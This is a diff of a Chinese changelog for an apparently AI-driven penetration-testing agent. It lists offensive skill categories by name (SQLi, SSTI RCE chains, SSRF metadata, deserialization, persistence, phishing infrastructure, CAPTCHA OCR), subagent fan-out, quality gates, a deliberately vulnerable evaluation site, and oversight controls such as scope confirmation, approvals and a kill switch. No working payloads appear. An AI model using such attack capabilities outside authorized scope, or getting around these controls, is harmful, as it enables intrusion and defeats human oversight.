-- 新增（G2 覆盖完整性收口门·引擎硬门）：实测某实战授权测试任务 XSS×7/认证×5/SSRF×9/越权遍历下载成片零触达仍正常收口——「测完必记覆盖」只管测了要记、不管没测不许过；新增 S2-9 目标自述面清单：目标自述能力面/漏洞面（平台导航逐项命名功能与漏洞、API 文档端点目录、CMS 模块清单）时抓取为结构化 checklist.json（条目/位置/漏洞类推断，上限 100 条，无自述面不产出门自动不生效，通用目标零打扰）；s4/s5 收口时确定性对账（零 LLM 成本）：每条目必须满足其一——覆盖登记的 Endpoint/Param/VulnClass/Notes 归一化后引用条目文本（前 12 字符）或 C 编号/Hint 路径、或清单条目显式 status=deferred/excluded 处置（非 covered 必附 reason）；延期/排除占比 >50% 追加「广度不足」拦截项
-- 新增：normCovText 归一化（小写+全角转半角+去空白，G2/G3 共用）与 parseChecklistItems 宽容解析（{"items":[…]} 与裸数组双兼容）
-- 改进：s2 头新增 S2-9 自述面清单提取步骤；s4 头新增 S4-8 清单对账（引用条目文本/C 编号归账口径）；s5 头 S5-6 补 s5 收口同口径；loop-core「测完必记覆盖」补 checklist 归账纪律
-- 测试：TestChecklistCoverageGate 回归（无清单不生效/3 条未覆盖全拦/文本与 Hint 双路径归账/deferred 缺 reason 拦截补齐放行/延期超半数广度拦截）；Go 全量通过
+- 新增（覆盖完整性收口门）：自述面清单提取与收口对账
+- 新增（归一化与宽容解析）
+- 改进（s2/s4/s5 清单对账步骤）
 
 ## v3.8.5 · 2026-11-09
 
-- 新增（G1 探测→发现晋升对账器·引擎硬门）：实测某实战授权测试任务宽字节/base64 绕过探针成功（sleep 3.2s 延时铁证在 evidence 日志）却未晋升为发现/覆盖登记——「探测成功→清单登记」漏斗漏液靠提示词纪律压不住；现 s4/s5 收口时无条件执行确定性对账（反思 PASS 也过、反思故障时兜底路径也过，零 LLM 成本）：扫描 evidence/ 日志中的成功信号（TIME≥2.5s 时延命中、sqlmap 类确证关键词），与发现库/覆盖矩阵/黑板事实/交付物文本交叉比对，「有信号、无归档」的孤儿结果拦截收口并给出三条归档路径（record_finding / update_coverage 引用证据文件名 / 交付物留痕排除理由）
-- 新增：执行器 ListDir 工作区相对目录列举方法（路径沙箱内、目录不存在返回空），供质量门扫描证据目录复用
-- 改进：complete_stage 无条件确定性硬校验范围从 s8 扩展至 s4/s5（与 s8 报告一致性门同构，受 ReviewRounds<2 约束防死循环）
-- 测试：TestOrphanProbeReconciliation 回归（孤儿时延/sqlmap 信号拦截、低时延噪声放行、覆盖 Notes/发现 Detail/发现留痕排除三归档路径放行、s5 同样生效）；Go 全量通过
+- 新增（孤儿探测对账器）：成功信号与发现/覆盖/黑板交叉对账
+- 新增（工作区目录列举方法）
+- 改进（硬校验范围扩展至 s4/s5）
 
 ## v3.8.4 · 2026-11-08
 
-- 改进（内容整合）：技能库与执行循环提示词全文清理——移除所有外部来源标记（来源小节标题/行内标注/来源声明），83 处引用归零；全部增量内容原样保留（技能库 85 个、提示词新增纪律不变），仅消除版本间的来源分层痕迹
-- 测试：Go 全量通过；打包敏感扫描通过；verify 连续两轮零 FAIL；部署后 API 确认
+- 改进（内容整合）：技能与提示词全文移除外部来源标记
 
 ## v3.8.3 · 2026-11-08
 
-- 新增（一线 SRC二刷·行级增量整合）：四份行级 diff 审计（注入族 58 条/Web 客户端族 64 条/基础设施+SRC 深矿 86 条/API 认证族 26 条）合计 234 条行级增量，全部以「一线 SRC二刷增量」小节追加到 31 个技能文件——每条为九头鸟技能里确实没有的 payload/判据/命令/表格行
-- 高价值增量亮点：sqli 报错指纹路由表+UNION 三步+OOB 全载荷+提权四路+预编译盲区；SSTI 各引擎 RCE 链（Jinja2 五链/Twig/FreeMarker/Velocity/ERB/Thymeleaf/AngularJS CSTI）+Flask debug PIN 六要素；XXE 报错式外带+docbookx 重定义完整实体+路径库补全；SSRF Azure/K8s/GCP 元数据+127.0.0.1 回环变体全集+dict:// 写 Redis 四连+时间侧信道；反序列化多语言补全（Ruby/Node/.NET payload 级）+Shiro 四枚 key+RMI 一键+PHPGGC 全链；XSS 上下文逃逸表补 5 行+盲打方法论+CSPT2CSRF；auth 密码重置 22 模式+「响应包无 token/sign」判据；IDOR 对象 ID 位置全清单+ORM filter 注入；限购五变体+验证码六路径矩阵
-- 改进（loop-core）：新增「输出位置四问」（目标类型/权限模型/输入位置/输出 sink——sink 决定漏洞类选型）+「过滤器复用横向直觉」（一个点可绕则同类页同 bypass 重试，配 waf-fingerprint 落指纹）
-- 核查：verify 连续两轮零 FAIL；全部增量经与九头鸟 85 技能逐条去重确认；31 个文件已注入（type-juggling 勘误——0e 魔法哈希成立条件为两串摘要各自匹配 ^0ed+$ 不要求相同）
+- 新增（实战行级增量整合）：234 条行级增量注入 31 个技能
+- 改进（loop-core）：输出位置四问与过滤器横向直觉
 
 ## v3.8.2 · 2026-11-08
 
-- 修复（第 13 轮核查·关键生效路径）：确定性质量门此前仅在反思 LLM 调用失败时执行——反思返回 PASS 时报告-发现不一致/同根因双记的机械检查完全跳过（实测 JT 任务缺陷在反思 PASS 下漏过的场景）；现 s8 收口时无条件执行确定性硬校验（与 LLM 反思互补，零 LLM 成本），两类拦截均计入 ReviewRounds（连续拦截两次后放行并留痕，防死循环）
-- 核查（payload 正确性抽查）：0e 魔法哈希（md5/sha1 全数字科学计数法语义）与双层 base64 嵌套 round-trip 计算验证通过；新增 s8 全路径回归测试
+- 修复（确定性门全路径生效）：s8 收口无条件执行确定性硬校验
 
 ## v3.8.1 · 2026-11-08
 
-- 新增（合规门禁·一线 SRC红线图 OCR 提炼）：loop-core 合规前提新增「S1 开工第一步红线复述确认」——向用户复述红线四要素（测试范围/禁止项/频率限制/数据访问边界），经 request_user_input 明确确认后方可执行主动测试；未确认前仅 L0 被动侦察。与建项目授权确认、S7 清理铁律形成三段式合规链
-- 修复（补充缺陷·实测连续两个任务 findings.json 同根因双记）：s8 确定性质量门新增对称校验——归一化标题（全角转半角/去空白/小写）前 24 字符相同的两条发现即拦截，要求按定级表合并（原疑似记录 detail 标注映射）；回归测试双向验证
-- 核查（一线 SRC二刷残留）：补提取 2 个漏转 PDF（搭建AI 体系/不安全对象调用案例(1)）与 4 个 .doc 的 catdoc 精确提取（南开 4.3KB 有效正文）；SRC红线.png OCR；.sample/assets 确认无价值；全量 136 文件状态归档
+- 新增（红线复述确认门）：开工第一步红线四要素确认
+- 修复（同根因双记拦截）：归一化标题前缀对称校验
 
 ## v3.8.0 · 2026-11-08
 
-- 新增（技能库大扩容·一线 SRC安全 133 文档精读整合）：技能 74 → 85——净新增 11 个技能：logic-sms-otp-matrix（短信/邮箱验证码六路径攻击矩阵+轰炸绕过变体）、logic-purchase-limit（限购/首单/订阅/订单复用五变体+时间叠加定级）、rce-hunting-map（RCE 信号判据+组合拳决策树+白盒函数清单+可复用 PoC 模式）、edu-src-playbook（教育行业 SOP：fofa 收缩链/身份四件套/厂商默认密码四路/webvpn 内网定位）、clickjacking、xslt-injection、dependency-confusion、type-juggling、extra-injection-types（SSI/LDAP/XPath/LaTeX/编码变换）、hpp-http-parameter-pollution、crlf-injection
-- 新增（现有技能 18 处深化增补，全部为原技能没有的具体 payload/判据/变体）：sqli-deep（SQLite ATTACH 写马/MySQL SMB 外带/CTF 八技术/冷门库/预编译盲区）、cmdi-deep（disable_functions 六路径/组件注入/bypass 九招）、xxe-full（本地 DTD 路径库/XInclude/Solr 链）、ssrf-deep（冷门元数据/CDP 接管/时间侧信道判内网存活）、xss-context（CSP 分厂商绕过/CSS 渗出/DOM clobbering/双层 base64）、race-condition（三子类+Turbo gate 语法）、api-idor（ORM filter 注入/跨功能对象搬运/掩码重构）、auth-flow-deep（密码重置 22 模式/「响应包无 token/sign」判据）、jwt-crypto/upload-bypass/logic-csrf-deser/prototype-pollution/cache-poisoning/request-smuggling/cors-redirect-hostheader/capability-primitive-search（BURN 原语）/recon-playbook（GitHub dork 全集/文库→fofa→通杀/VPN 内网定位）/app-dynamic-audit/miniapp-audit/java-deser-playbook/cms-playbook/devops-exposed
-- 新增（方法论纪律·AI 挖洞文章提炼）：loop-core 三条——①收尾必做经验提炼与 failure_modes 记录；②「元认知切换」：连续两轮无新增确证时切换五框架思考（业务价值逆向/开发者偷懒推测/正交组合/单点变异/覆盖度对抗），产出落到四要素（动词+对象+落盘+命中信号）；③同根因升级确证后原疑似记录标注取代
-- 新增（路由）：00-router 一区 13 行 + 二区 2 行新路由（短信矩阵/限购/RCE 地图/教育行业/扩展注入面/点击劫持/类型混淆/依赖混淆/HPP/CRLF 全部接线，零悬空）
-- 来源与合规：一线 SRC安全 hack-skills 技能库（51 文件）+ 一线 SRC 实战案例库（82 文件）全量精读提炼，仅吸收方法论与公有技术 payload；全部案例已通用化脱敏，不含任何真实目标/项目标识；技能增量均经与现有 85 技能逐条去重
-- 测试：Go 全量通过；verify 连续两轮零 FAIL；技能引用零悬空扫描通过
+- 新增（技能库扩容 74→85）：11 个新技能
+- 新增（现有技能 18 处深化增补）
+- 新增（方法论纪律三条）：经验提炼/元认知切换/同根因取代
+- 新增（路由接线）：15 行新路由
 
 ## v3.7.7 · 2026-11-08
 
-- 新增（部署守卫）：scripts/deploy.sh——部署前检查有无运行中项目，有则拒绝并提示（--force 可跳过）；实测两次部署打断运行任务的流程性根治
-- 新增（重启自愈·auto_resume）：引擎重启后对被中断（paused）的项目自动断点续跑（engine.auto_resume 默认开，延迟 30s 等待人工观察窗口，期间人工处置/熔断的项目自动跳过）——重启/部署不再丢任务，配合 v3.7.5 paused 横幅形成完整闭环
-- 改进（速度纪律）：loop-core 明确自带联网更新的命令（searchsploit -u/apt/git pull/nuclei -update）一律视为长任务必须 run_async 后台化（实测 apt 网络挂死 1.5h 占死执行轮次）
-- 测试：Go 全量通过；verify 连续两轮零 FAIL；后续部署统一走 deploy.sh（含守卫+就绪检查）
+- 新增（部署守卫）：运行中项目拒绝部署
+- 新增（重启自愈）：paused 项目自动断点续跑
+- 改进（速度纪律）：联网更新命令一律后台化
 
 ## v3.7.6 · 2026-11-08
 
-- 修复（严重·实测卡死 3.5h）：任务 JT（某目标.edu.cn）在 s2 执行 searchsploit -u 后整条执行循环卡死——searchsploit 内部拉起 apt install 网络挂死 1.5h，继承 stdout 管道的孙进程让 cmd.Wait() 永不返回（超时只杀直接子进程），注入的指挥室指令也因此不被消费；杀掉挂死进程后循环 2 秒内恢复。引擎级根治：同步命令 Setpgid 独立进程组 + ctx 到期 Cancel 杀整组（孙进程一并终止）+ WaitDelay=10s 强制 Wait 返回；后台任务与交互会话同补 WaitDelay
-- 测试：孙进程握管道回归（2s 超时 + 60s 孙进程，10s 内返回）；Go 全量通过
+- 修复（孙进程卡死）：同步命令独立进程组、组终止与 WaitDelay
 
-## v3.7.5 · 2026-11-07
+## v3.7.5 · 2026-11-08
 
-- 修复（v3.7.4 引入·严重）：paused 横幅改动吞掉了 .wb 三栏容器开标签——StageRail/MsgStream/Inspector 直接挂到纵向 flex 的外层容器下，整工作台垂直堆叠、Inspector 覆盖对话输入框（用户实测截图）；现补回 .wb 嵌套（横幅 flex-shrink:0 + .wb flex:1 min-height:0），输入框不再被遮挡，横幅正常显示于顶部
-- 回归：E2E 增加 paused 场景断言（横幅可见 + 输入框底部边界不超视口 + 三栏 row 布局存在）
+- 修复（横幅布局）：补回工作台容器嵌套
 
 ## v3.7.4 · 2026-11-07
 
-- 修复（BUG-001，用户截图实测）：工作台 Inspector 第 6 个 Tab「黑板」溢出被裁切——6 个带徽标 Tab 内容总宽超 368px 固定面板；按 A+B 组合修复：A) .tabs 允许横向滚动兜底；B) .tab 允许收缩（min-width:0）+ 徽标 ≥100 压缩为 99+ + 6Tab 字号/内边距降档；E2E 加末位 Tab 边界断言防回归
-- 新增（s8 报告-发现一致性质量门）：某真实任务实测缺陷——报告定级 4 条 R 条目，findings.json 导出仅 3 条（缺传输层/配置类入库）；确定性质量门硬校验 R 条目数 ≤ findings 记录数，缺项即 BLOCK 并提示补录（含高频漏项指引）
-- 改进（收录纪律）：loop-core 明确传输层/配置类确证发现（明文传输、弱哈希等）必须 record_finding 入库；同根因升级确证后原疑似记录标注「已被 R-xx 取代」
-- 新增（UX）：项目因引擎重启进入 paused 时工作台顶部横幅提醒「点击当前阶段重跑续测」——消除实测中 61 分钟的无感知等待
-- 测试：一致性质量门回归（缺项拦截/补录放行）；npm 构建；verify 连续两轮零 FAIL；隔离实例 E2E 含 Tab 溢出边界断言
+- 修复（Tab 溢出）：横向滚动兜底与压缩降档
+- 新增（报告-发现一致性门）：报告条目数硬校验
+- 改进（收录纪律）：传输层/配置类发现必须入库
+- 新增（paused 横幅提醒）
 
 ## v3.7.3 · 2026-11-07
 
-- 修复（v3.7.2 引入·严重）：Workbench 组件 setup 崩溃——运行中兜底轮询使用了 watch/onUnmounted 但 import 行替换静默失败（模式含多余尾随空格未匹配），生产工作台整页白屏（ReferenceError: watch is not defined）；由第 10 轮真实浏览器 E2E 在 v3.7.2 上抓到（此前构建绿灯为假阴性：Rollup 不报未声明标识符）
-- 修复过程留痕：WS 帧抓包证实 stage_tool/黑板事件正常送达（排除引擎侧），页面内标记法证实零整页重载（排除测试歧义），最终定位到组件崩溃；E2E 重跑后黑板/战利品/交付物零刷新实时更新全绿
-- 教训：SFC 内未声明标识符构建期不报错——真实浏览器 E2E 升级为 Web 改动的必过门槛（本次即为唯一能拦住此类缺陷的手段）
+- 修复（工作台白屏）：兜底轮询导入缺失修正
 
 ## v3.7.2 · 2026-11-07
 
-- 修复（用户实测反馈·数据实时性）：工作台「交付物/黑板」（含覆盖度）在运行期间不刷新——stage_tool 事件被执行流消费后不再触发任何数据重载，面板永远停留在进入项目时的快照，须手动刷新页面才更新；现按工具名映射定向数据重载（upsert_fact/record_loot/spawn_subagent/poll_subagents→黑板、write_file→交付物、update_coverage→覆盖度、record_*/plan_subtasks→详情，400ms 去抖）
-- 新增（兜底）：运行中项目每 15s 兜底轮询黑板/交付物/覆盖度——覆盖 WS 重连窗口与未映射事件，页面不刷新也能看到智能体的实时工作状态
-- 改进：Mock 客户端脚本补 upsert_fact/record_loot 调用——评测环与 E2E 从此覆盖黑板/战利品链路
-- 测试：真实浏览器 E2E 实证「不刷新页面，黑板/交付物随流水线实时变化」（隔离 mock 实例）；Go 全量回归通过；verify 连续两轮零 FAIL
+- 修复（面板实时刷新）：按工具名定向数据重载
+- 新增（兜底轮询）：15s 周期刷新黑板/交付物/覆盖度
+- 改进（Mock 客户端覆盖黑板链路）
 
 ## v3.7.1 · 2026-11-07
 
-- 修复（v3.7.0 引入·运行时级）：stores/projects.js 的 loadBoard 方法此前一次正则替换静默失败未真正插入，而仪表盘已在调用 projects.loadBoard(...)——同步 TypeError 使仪表盘 onMounted 崩溃（npm 构建不检查对象属性存在性，构建绿灯是假阴性）；现正确插入方法（select 时与 refresh/coverage/files 并行加载，失败静默空态兜底）
-- 核查（第 8 轮新增维度）：运行容器内前端资产含新组件 ✓；未实测的 SVG 渲染链路用真实 dot 实测通过（graphviz 正常出图）✓；新 API 未认证 401 ✓；并由此发现本缺陷
+- 修复（loadBoard 缺失）：方法正确插入
 
 ## v3.7.0 · 2026-11-07
 
-- 新增（控制台可视化·补齐引擎新状态层的展示欠账）：后端 4 个只读接口（/facts /loot /subagents /lessons）+ 工作台「黑板」Tab（三节合一：在途子代理运行态 / 事实账本三态着色与图边 / 战利品掩码表格）+ 仪表盘「黑板事实/战利品」计数卡——此前黑板/战利品/子代理/教训对用户完全不可见（grep 全库零命中）
-- 新增（交付视图）：攻击路径图进报告页——exportArtifacts 在 graphviz 可用时同步渲染 attack-graph.svg（容器 apt 预装 graphviz），报告页顶部嵌入展示；不可用环境自动隐藏回退 md
-- 去重审计（用户要求：重复展示对比择优）：①工具调用双视图（MsgStream 时序内联 vs Inspector 全量卡片）判定为职责不同保留，Inspector Tab 加工具名筛选强化「审计」定位；②report.md 双处（ReportPage 成稿 vs 交付物清单工作文件）语义分层保留；③新增状态全部合并进单个「黑板」Tab 而非碎片化开页，教训归入技能库页（同为知识库）
-- 改进（易用性）：执行流类型过滤 chips（全部/消息/工具/日志，原只有日志开关）；审批「已过期（屏障超时）/已超时」中文标签；新建项目 4 个快速模板（Web/APP小程序/内网/AI-LLM，一键填充范围并在通用 ROE 上叠加专项条款）+ **ROE 从写死常量升级为可编辑字段**（实战定位：ROE 是逐项目不同的核心合规输入）
-- 测试：npm 本地构建通过；verify_release.sh 新增第 18 项「新状态层 API 可达」（四个接口逐一探活），随发版连续两轮全项零 FAIL
+- 新增（控制台可视化）：黑板/战利品/子代理/教训只读接口与工作台 Tab
+- 新增（攻击路径图进报告页）
+- 改进（界面去重择优）：工具调用双视图与报告双处保留判定
+- 改进（易用性）：类型过滤、中文标签、快速模板、ROE 可编辑
 
 ## v3.6.2 · 2026-11-07
 
-- 评测第三轮（v3.6.1）结果：召回率 100%（8/8，判分修正生效），子代理扇出采纳确认（s4 期间 28 次子代理 LLM 调用，引擎级上下文提示有效）；三轮累计：100% / 88%（词表误判，实际已确证）/ 100%
-- 调整：eval_run 默认时限 75 → 110 分钟——三轮实测均在 s7/s8 被时限截断（全管线从未完整到达 done 终态），提限以完成「报告产出→findings.json→判分」全链路闭环验证；评测站规模下 token 成本稳定在 6.3-7.8M
-- 核查：verify_release.sh 发版全项核查随本版入库（17 项），本次发版连续两轮 17/17 零 FAIL
+- 改进（评测时限）：默认时限提额
 
 ## v3.6.1 · 2026-11-07
 
-- 评测环首轮两轮实测落地（本地评测站 8 类预期漏洞）：轮1 覆盖口径 100%（8/8）、6.3M tokens；轮2 88%（7/8，75min 超时熔断截断）——暴露三项问题并全部修复：
-- 修复（判分词表）：轮2 的格式串漏洞实际已被确证（coverage：/admin/hello?name= vulnerable，{name.__class__}→MRO 回显即为正确证明），仅分类词为「注入」未被关键词接住；expected.json formatstr 补 __class__/__mro__/admin/hello 确认机制特征——判定"找到漏洞"而非"用了哪个词"；/search 的 SSTI 被正确 ruled_out（甄别质量佳）
-- 修复（扇出采纳率）：两轮评测 spawn_subagent 零调用——头内"可选"指引对 glm-5.3-flash 采纳率低；loop-core step2 升级为硬性要求（计划 ≥3 独立子任务立即扇出）+ s4/s5 上下文包引擎级注入扇出提示
-- 改进（s8 撰写效率）：两轮均卡在报告阶段（60+ 轮、复读全量交付物）；s8 头新增撰写效率纪律——先写框架按需定向取材料、引用+摘要为主、增量落盘、目标 ≤40 轮
-- 新增：scripts/verify_release.sh 发版全项核查（17 项：编译/测试/版本记录/README 一致性/技能引用/打包敏感扫描/镜像一致性/API 版本/Web/新符号/评测站分发），连续两轮 17/17 零 FAIL
+- 修复（判分词表）：判定「找到漏洞」而非「用了哪个词」
+- 修复（扇出采纳率）：扇出升级为硬性要求
+- 改进（s8 撰写效率）：撰写纪律
+- 新增（发版核查脚本）：17 项全项核查
 
 ## v3.6.0 · 2026-11-07
 
-- 新增（阶段内并行扇出·受控子代理，strix agents_graph / CAI 并行 worker 思想）：spawn_subagent 把相互独立的测试单元（多 endpoint×漏洞类/多目录枚举/多指纹验证）派给并行子代理——每个子代理独立消息链+独立轮次预算（engine.max_subagent_rounds 默认 12，上限 20），共享同一黑板/覆盖矩阵/审批矩阵/证据链；poll_subagents 收结果（运行中报进度、已结束报简报并标记消费）；主头负责整合与收口，收口前引擎强制检查在途子代理
-- 安全边界：子代理工具面是主头受控子集（无 complete_stage/loopback/plan_subtasks/request_* ——流程态与人工屏障只属于主头）；命令走同一审批矩阵（L2 照样拦截留痕）；项目熔断级联终止全部在途子代理；并发上限 engine.max_subagents 默认 3（0=禁用）
-- 新增：loop-core 扇出守则（同质独立单元才扇出，限速优先于速度）+ s4 新增 S4-5a 并行扇出动作；工具面 28 → 30
-- 修复（评测器）：状态轮询读顶层字段致全程 unknown、超时路径未熔断（"unknown"≠"running"）、无指标产出——现从包裹结构取 project.status/current_stage，超时正确熔断，报告携带耗时与 token 指标（首轮实测：8 类预期 100% 覆盖命中、6.26M tokens）
-- 测试：mock LLM 驱动的子代理完整生命周期（派发→运行→收结果→消费标记）+ 并发上限/禁用开关两组回归；全量 go test 通过
+- 新增（阶段内并行扇出）：受控子代理派发与结果收割
+- 新增（扇出安全边界）：受控工具子集与熔断级联
+- 新增（扇出守则与动作）
+- 修复（评测器状态解析与超时熔断）
 
 ## v3.5.1 · 2026-11-07
 
-- 修复（v3.5.0 评测环设计级缺陷）：评测站生命周期容器感知——智能体在容器内 curl 127.0.0.1，而 v3.5.0 的评测站起在宿主，容器内不可达，评测无论引擎强弱必得 0 分；现默认自动探测 jiutouniao 容器并经 docker exec 在容器内起评测站（与智能体同网络命名空间，健康检查也在容器内做），无 docker 环境回退本机模式；eval/ 随镜像分发（COPY eval/）
-- 测试：容器内可达性实测（robots.txt 200）、判分器冒烟、Python 语法检查；docker inspect 探测回退路径保留
+- 修复（评测站容器感知）：与智能体同网络命名空间
 
 ## v3.5.0 · 2026-11-07
 
-- 新增（技能进化评测环·communitytools 思想）：eval/ 评测体系——①自包含故意脆弱电商评测站 eval/target/target.py（纯标准库零依赖，8 类预期漏洞：SQLi 布尔盲注/反射 XSS/未授权 PII 遍历/路径穿越/弱默认口令/命令注入/格式串注入/源码备份泄露，只绑 127.0.0.1）；②评测器 scripts/eval_run.py（API 驱动：建项目→跑完流水线→按预期清单对 findings+coverage 判分→召回率+未命中清单+额外发现 → eval/results/eval-*.md）；③ make eval 一键入口；未命中项即技能库迭代输入，分数回退=引擎/技能回归
-- 新增（验证码本地 OCR·可选档）：browser_login.py --captcha-ocr——验证码可见时先尝试 ddddocr 本地识别自动填入（识别值不回显明文，与凭据脱敏口径一致），未命中/依赖缺失一律回退 exit 42 人工读码（默认关闭，合规口径不变）；Dockerfile 构建期 best-effort 预装 ddddocr（失败不阻塞，install_tool 兜底）
-- 新增（方法论技能 4）：k8s-attack（API/kubelet/etcd/Dashboard 暴露面 + SA token 滥用 + RBAC 提权候选 + 逃逸判据矩阵）、persistence（per-OS 持久化演示清单+四元组登记+心跳无害化，S6-4/S7 对接）、password-offline（hashcat 模式速查+中文场景字典工程+撞库合规门）、phishing-infra（SPF/DMARC 只读判定矩阵+投递演练双重门禁）——00-router 补 5 行路由，s6 全量接线，技能库 70 → 74
-- 测试：评测站 8 类漏洞逐一实测可用（布尔差/穿越/命令注入/格式串/泄露）、判分器单元冒烟（命中/extras/及格线）、Python 语法检查、Go 全量回归；部署包与镜像验证
+- 新增（评测环）：评测站、判分器与 make eval 入口
+- 新增（验证码本地 OCR 可选档）
+- 新增（方法论技能四件）：k8s/持久化/离线口令/钓鱼基础设施
 
 ## v3.4.3 · 2026-11-07
 
-- 修复（v3.4.2 修复自身引入）：轮询豁免分支在旧检测之后重复自增共享计数器——同签名第 2 次合法 poll 即提前触发提醒（设计为第 4 次），连续轮询类正常工作流被过早打扰；重构为单一计数 + 豁免判断前置于导师评审，第 4 次才提醒、零 LLM 成本
-- 新增（循环检测豁免扩容）：search_memory / list_files 纳入豁免——窗口压缩可能把早前检索结果存根化，重查是正确行为而非空转（重查后结论应 upsert_fact 上黑板防再丢，提醒文案已带此引导）；连续纯重查仍受确定性提醒约束
-- 修复：技能 frontmatter id 引号未剥离——00-router 的 id: "00-router" 原样入库，按 id 精确加载失配（query 模式不受影响，故实测未暴露）；解析器统一 Trim 引号
-- 核验：全库技能引用完整性扫描（heads+skills+prompts 全部 load_skill 引用 vs skills/ 实存，零悬空）；monitorCheck 豁免路径精确回归（第 2/3 次不触发、第 4 次触发、search/list 豁免、引号剥离）
+- 修复（轮询豁免计数）：单一计数重构
+- 新增（循环检测豁免扩容）：检索与列举类工具
+- 修复（技能 id 引号剥离）
 
 ## v3.4.2 · 2026-11-07
 
-- 修复（v3.2.0 引入的回归·环境变量白名单误杀 TOOL_PROXY）：loop-core 与上下文包都教智能体用 `env http_proxy=$TOOL_PROXY <命令>` 前缀走工具下载代理，v3.2.0 白名单把该变量清空后此前缀静默失效（$TOOL_PROXY 展开为空，外网下载悄悄直连、网络受限环境表现为莫名失败）；TOOL_PROXY 是代理地址非密钥，回归白名单，其余密钥项照旧拦截
-- 修复（循环检测误伤合法轮询）：poll_async/shell_read 的重复调用是工具文档明文要求的模式（poll 后做别的、稍后再 poll；实证 8 任务 124 次 poll_async），原实现窗口计数 warn@3 污染回执、break@5 空耗导师评审；现两类工具豁免签名窗口，「连续 4 次纯轮询」同步死等反模式降级为零 LLM 成本的确定性提醒
-- 修复（Kill 后对话轮可绕过熔断）：熔断只取消在途轮，下一轮 chatCtx 重新注册新 ctx 继续跑（LLM 照常、工具靠审批拒绝兜底，白耗至 24 轮上限）；现 chatCtx 先查项目终态，已熔断项目直接返回已取消 ctx，对话轮立即终止
-- 核验：三轮批次（v3.2.0/v3.3.0/v3.4.x）跨功能交互面专项审查——轮询×循环检测、代理×环境白名单、熔断×对话轮、spill×证据、压缩×指令注入、会话×KillAll、黑板/教训注入上限、教训脱敏含域名共 10+ 交叉点逐项过筛
-- 测试：TOOL_PROXY 白名单保留、轮询豁免（8 次合法 poll 零介入 + 非豁免同签名第 3 次仍预警）、熔断项目对话 ctx 立即 Done（活跃项目不受影响）三组回归；全量 go test 通过
+- 修复（TOOL_PROXY 白名单误杀）
+- 修复（轮询类工具豁免签名窗口）
+- 修复（Kill 后对话轮绕过熔断）
 
 ## v3.4.1 · 2026-11-07
 
-- 修复：barrier_timeout_sec 代码默认值缺失——v3.4.0 仅在 config.example 提供示例值，未配置该键的部署实际为 0（审批/提问仍无限等待），与更新记录「默认 1800=30min」承诺相悖；现 applyDefaults 兜底 1800（<=0 视为默认，显式配置可覆盖），main 无条件注入，新增回归测试锁定
-- 修复：run_command 的 stderr 并入证据链——v3.4.0 stderr 已独立捕获但合流点在证据落库之后，证据链只有 stdout，错误细节（报错堆栈/扫描器诊断）回溯失真；现提前到证据写入前
-- 修复：攻击路径缝合器不再被「无漏洞早退」挡住——只有黑板事实/战利品而暂无 findings 的项目（情报链完备、利用队列待验证形态）此前不产出 attack-graph，现移至 findings 导出之前
-- 核验：v3.4.0 全量交付逐项复核通过（后台任务持久化/屏障超时接线/对话可熔断/确定性质量门/错误自愈/教训库/死配置接线），测试禁缓存全绿
+- 修复（屏障超时默认值缺失）
+- 修复（stderr 并入证据链）
+- 修复（攻击图无漏洞早退）
 
 ## v3.4.0 · 2026-11-07
 
-- 新增（平台韧性①·后台任务持久化）：run_async 任务元数据落盘 .async/job-<id>.json——引擎重启后 poll_async 从 sidecar 恢复状态与日志尾部（pid 存活判态），「未知 job id」失联与断点续跑失去后台任务支撑的问题清零
-- 新增（平台韧性②·人工屏障超时）：engine.barrier_timeout_sec（默认 1800=30min）——人工审批与向人提问不再无限挂起流水线（实证 manual 策略下单个未读工单空等 115 分钟）；超时工单标 expired、提问自动取消，模型走保守路径或收口说明
-- 新增（平台韧性③·对话通道可熔断）：对话指挥室的 LLM 调用与工具轮次此前用 context.Background()，一键熔断管不到；现按项目注册可取消 ctx，Kill 级联取消在途对话轮
-- 新增（确定性质量门）：反思门 LLM 调用失败原为 fail-open 直接放行；现由引擎硬校验兜底——高危确证发现必须引用证据（EV-/evidence//poc/，T3MP3ST 引证校验思想）、s4/s5 覆盖矩阵与发现非空，不通过即拦截
-- 新增（攻击路径缝合器·communitytools attack-path-stitcher 思想）：结项自动把黑板事实（links=图边）+ 战利品（凭据复用=虚线边）缝合为 deliverables/attack-graph.dot + attack-graph.md（graphviz 可渲染），单点发现升维成业务影响链
-- 新增（错误自愈·hexstrike 错误分类思想）：run_command 失败按特征给处置建议（超时→后台化降规模 / connection refused→先探开放性 / DNS 失败→用 IP 或核范围 / 403→WAF 分型），配 stderr 独立捕获（原 CombinedOutput 混流、Stderr 恒空死字段）
-- 新增（组织级教训库·BoxPwnr 失败分析注入的跨项目版）：record_lesson 工具登记跨项目通用经验，引擎强校验脱敏（含 IP/URL/域名即拒绝），最近 8 条随上下文包自动注入——跨项目零知识迁移（某招生平台目标 S1 重做三遍）的解法
-- 改进（死配置接线）：engine.max_concurrent_exec 从未生效的硬编码 4 改为真接线；项目级 budget_tokens 接入预算护栏（原死字段，全局配置仍兜底）
-- 测试：后台任务重启恢复、stderr 分离、审批屏障超时（1s 实测）、确定性质量门（无证据高危拦截/有证据放行）、攻击图构建、教训脱敏校验、错误自愈映射；全量 go test 通过
+- 新增（后台任务持久化）：作业元数据落盘与重启恢复
+- 新增（人工屏障超时）：审批/提问不再无限挂起
+- 新增（对话通道可熔断）
+- 新增（确定性质量门）：高危确证必须引用证据
+- 新增（攻击路径缝合器）：黑板与战利品缝合为影响链图
+- 新增（错误自愈）：失败按特征给处置建议
+- 新增（组织级教训库）：跨项目经验登记与注入
+- 改进（死配置接线）：并发上限与项目预算真接线
 
 ## v3.3.1 · 2026-11-07
 
-- 文档：修正技能总数口径（v3.3.0 记录误写 71，实际 70 = 66 基数 + v3.2.0 能力原语凑链 + v3.3.0 内网横向/边界设备/WebShell 三个新增；ad-attack 为原地扩容不计新增）
-- 测试：交互会话补 stderr 合流验证（会话输出管道 stdout/stderr 同源，err 输出与 out 同流回读），核实 v3.3.0 全量交付清单（引擎接线/技能/版本产物/部署包/容器一致性逐项复核通过）
+- 修复（文档口径）：技能总数统计修正
 
 ## v3.3.0 · 2026-11-07
 
